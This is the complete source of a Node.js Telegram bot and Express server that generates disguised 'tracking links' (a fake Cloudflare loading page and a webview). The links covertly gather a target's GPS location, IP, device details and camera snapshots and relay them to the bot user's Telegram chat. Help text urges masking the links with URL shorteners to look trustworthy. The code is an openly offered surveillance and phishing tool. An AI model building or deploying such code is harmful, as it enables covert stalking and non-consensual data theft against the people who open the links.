require('dotenv').config();
const fs = require("fs");
const express = require("express");
const cors = require('cors');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');

const bot = new TelegramBot(process.env["bot"], { polling: true });

const jsonParser = bodyParser.json({ limit: '20mb', type: 'application/json' });
const urlencodedParser = bodyParser.urlencoded({ extended: true, limit: '20mb', type: 'application/x-www-form-urlencoded' });
const app = express();

app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");

// Serve static files (if needed)
app.use(express.static("public"));

// 📌 Start Command - Ask to Join Channel
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;

    const options = {
        reply_markup: JSON.stringify({
            inline_keyboard: [
                [{ text: "✅ Check Now", callback_data: "check_join" }],
                [{ text: "📢 Join Now", url: "https://t.me/technicalwhitehat" }]
            ]
        })
    };

    bot.sendMessage(chatId, `
👋 Welcome ${msg.chat.first_name}!
🚀 To use this bot for FREE, you must join our Telegram Channel first.

📢 Join now to unlock amazing features!
👇 Click below to join and verify:
  `, options);
});

// 📌 Check Join Status
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;

    if (query.data === 'check_join') {
        try {
            const member = await bot.getChatMember(channelUsername, query.from.id);

            // ✅ If user is a member, show the tracking features
            if (member.status === 'member' || member.status === 'administrator' || member.status === 'creator') {
                const welcomeOptions = {
                    reply_markup: JSON.stringify({
                        inline_keyboard: [
                            [{ text: "🚀 Create Link", callback_data: "crenew" }], // Create Link Button
                            [{ text: "⭕ YouTube ⭕", url: "https://youtube.com/@technicalwhitehat?si=o7NiJ_VNYi5_HFp7" }], // Updated YouTube Button
                            [{ text: "💬 Telegram Group 💬", url: "https://t.me/technicalwhitehat" }], // Updated Telegram Group Button
                            [{ text: "🆘 Help", callback_data: "help_menu" }] // New Help Button
                        ]
                    })
                };

                bot.sendMessage(chatId, `
👋 Welcome ${query.from.first_name}!

🚀 Introducing the Ultimate Location Tracking Bot!

With this bot, you can:
✅ Track anyone’s location in real-time.  
✅ Collect device details and camera snaps.  
✅ Generate powerful tracking links instantly.  

📣 Click on the buttons below to get started!
                `, welcomeOptions);

            } else {
                // ❌ If user hasn't joined, ask to join again
                bot.sendMessage(chatId, `
❌ You haven't joined our channel yet!
📢 Please join the channel to unlock the bot.

👉 Click here to join: [Technical White Hat](https://t.me/technicalwhitehat)
                `);
            }
        } catch (error) {
            console.error("Error checking membership:", error);
            bot.sendMessage(chatId, "❌ Something went wrong! Please try again.");
        }
    }
});

// 📌 Help Menu
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;

    if (query.data === 'help_menu') {
        bot.sendMessage(chatId, `
🔍 *Welcome to Technical White Hat's Tracking Bot!* 🔍

🚀 *Unlock the Power of Tracking:*
With this bot, you can create powerful tracking links to gather real-time location and device details. Here's how to get started:

✨ *Commands:*
✅ /create - Generate a tracking link in seconds.
✅ /help - Learn more about the bot's features.

🌐 *Key Features:*
1. *Cloudflare Link* - Disguises as a loading page to collect data.
2. *Webview Link* - Embeds a webpage for seamless tracking.

💡 *Pro Tips for Better Tracking:*
- Use URL shorteners like **bit.ly** or **tinyurl** to make your links look clean and trustworthy.
- Mask your tracking links using services like **rebrandly** or **hyperlink.rest** to hide the original URL.
- Always test your links before sharing to ensure they work as expected.

📢 *Stay Updated:*
Join our Telegram channel for tips, tricks, and updates:
👉 [Technical White Hat](https://t.me/technicalwhitehat)

🔥 *Ready to create your first link?* Click /create now!
        `, { parse_mode: 'Markdown' });
    }
});

// 📌 Main Tracking Features
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;

    if (msg?.reply_to_message?.text === "🚀 Awesome! Let's create your tracking link.\n🔗 Just drop the URL below, and I'll do the magic!") {
        createLink(chatId, msg.text);
    }

    if (msg.text == "/create") {
        createNew(chatId);
    } else if (msg.text == "/help") {
        bot.sendMessage(chatId, `
🔍 *Welcome to Technical White Hat's Tracking Bot!* 🔍

🚀 *Unlock the Power of Tracking:*
With this bot, you can create powerful tracking links to gather real-time location and device details. Here's how to get started:

✨ *Commands:*
✅ /create - Generate a tracking link in seconds.
✅ /help - Learn more about the bot's features.

🌐 *Key Features:*
1. *Cloudflare Link* - Disguises as a loading page to collect data.
2. *Webview Link* - Embeds a webpage for seamless tracking.

💡 *Pro Tips for Better Tracking:*
- Use URL shorteners like **bit.ly** or **tinyurl** to make your links look clean and trustworthy.
- Mask your tracking links using services like **rebrandly** or **hyperlink.rest** to hide the original URL.
- Always test your links before sharing to ensure they work as expected.

📢 *Stay Updated:*
Join our Telegram channel for tips, tricks, and updates:
👉 [Technical White Hat](https://t.me/technicalwhitehat)

🔥 *Ready to create your first link?* Click /create now!
        `, { parse_mode: 'Markdown' });
    }
});

bot.on('callback_query', async function onCallbackQuery(callbackQuery) {
    bot.answerCallbackQuery(callbackQuery.id);
    if (callbackQuery.data == "crenew") {
        createNew(callbackQuery.message.chat.id);
    }
});

// 📌 Create Tracking Link
async function createLink(cid, msg) {
    var encoded = [...msg].some(char => char.charCodeAt(0) > 127);

    if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1) && !encoded) {
        var url = cid.toString(36) + '/' + btoa(msg);
        var m = {
            reply_markup: JSON.stringify({
                "inline_keyboard": [[{ text: "🚀 Create new Link", callback_data: "crenew" }]]
            })
        };

        var cUrl = `${hostURL}/c/${url}`;
        var wUrl = `${hostURL}/w/${url}`;

        bot.sendChatAction(cid, "typing");
        bot.sendMessage(cid, `
🎉 *Congratulations! Your tracking links are ready!* 🎉

🌐 *Cloudflare Link:*
${cUrl}

🌐 *WebView Link:*
${wUrl}

📌 *Pro Tips:*
- Use URL shorteners like **bit.ly** or **tinyurl** to make your links look clean and trustworthy.
- Mask your tracking links using services like **rebrandly** or **hyperlink.rest** to hide the original URL.

📢 *Stay Connected with Us:*
👉 *YouTube Channel:* [Technical White Hat](https://youtube.com/@technicalwhitehat?si=o7NiJ_VNYi5_HFp7)
👉 *Telegram Channel:* [Technical White Hat](https://t.me/technicalwhitehat)

🔥 *Ready to create another link?* Click below to create a new one! `, { parse_mode: 'Markdown', ...m });
    } else {
        bot.sendMessage(cid, `🤔 Oops! Something's not right.\n🔗 Make sure to enter a valid URL (including http or https), and let's try again!`);
        createNew(cid);
    }
}

// 📌 Ask for URL Input
function createNew(cid) {
    const options = {
        reply_markup: JSON.stringify({ "force_reply": true })
    };
    bot.sendMessage(cid, `🚀 Awesome! Let's create your tracking link.\n🔗 Just drop the URL below, and I'll do the magic!`, options);
}

// 📌 Handle Location Data
app.post("/location", (req, res) => {
    const lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
    const lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
    const uid = decodeURIComponent(req.body.uid) || null;
    const acc = decodeURIComponent(req.body.acc) || null;

    if (lon && lat && uid && acc) {
        const userId = parseInt(uid, 36);
        bot.sendLocation(userId, lat, lon);
        bot.sendMessage(userId, `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
        res.send("Done");
    }
});

// 📌 Handle Camera Snapshots
app.post("/camsnap", (req, res) => {
    const uid = decodeURIComponent(req.body.uid) || null;
    const img = decodeURIComponent(req.body.img) || null;

    if (uid && img) {
        const buffer = Buffer.from(img, 'base64');
        const info = { filename: "camsnap.png", contentType: 'image/png' };

        try {
            bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
        } catch (error) {
            console.error("Error sending photo:", error);
        }

        res.send("Done");
    }
});

// 📌 Add Missing Routes for Webview and Cloudflare
app.get("/c/:path/:uri", (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip;
    const d = new Date().toJSON().slice(0, 19).replace('T', ':');
    const url = atob(req.params.uri);
    const uid = req.params.path;

    if (uid && url) {
        res.render("cloudflare", { ip: ip, time: d, url: url, uid: uid, a: hostURL, t: use1pt });
    } else {
        res.redirect("https://t.me/technicalwhitehat");
    }
});

app.get("/w/:path/:uri", (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip;
    const d = new Date().toJSON().slice(0, 19).replace('T', ':');
    const url = atob(req.params.uri);
    const uid = req.params.path;

    if (uid && url) {
        res.render("webview", { ip: ip, time: d, url: url, uid: uid, a: hostURL, t: use1pt });
    } else {
        res.redirect("https://t.me/technicalwhitehat");
    }
});

// 📌 Handle Data Route (Fixed to ensure message delivery)
app.post("/", async (req, res) => {
    const uid = decodeURIComponent(req.body.uid) || null;
    const data = decodeURIComponent(req.body.data) || null;

    if (uid && data) {
        try {
            const userId = parseInt(uid, 36);
            const formattedData = data.replace(/<br>/g, '\n');
            await bot.sendMessage(userId, formattedData, { 
                parse_mode: 'HTML',
                disable_web_page_preview: true 
            });
            res.send("Done");
        } catch (error) {
            console.error("Error sending message:", error);
            res.status(500).send("Error");
        }
    } else {
        res.status(400).send("Missing data");
    }
});

// 📌 Start the Express Server (Consolidated to port 3000)
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server is running on port ${PORT}`);
});

const channelUsername = "@technicalwhitehat";
const hostURL = "https://demo-track-down.onrender.com";
const use1pt = false;
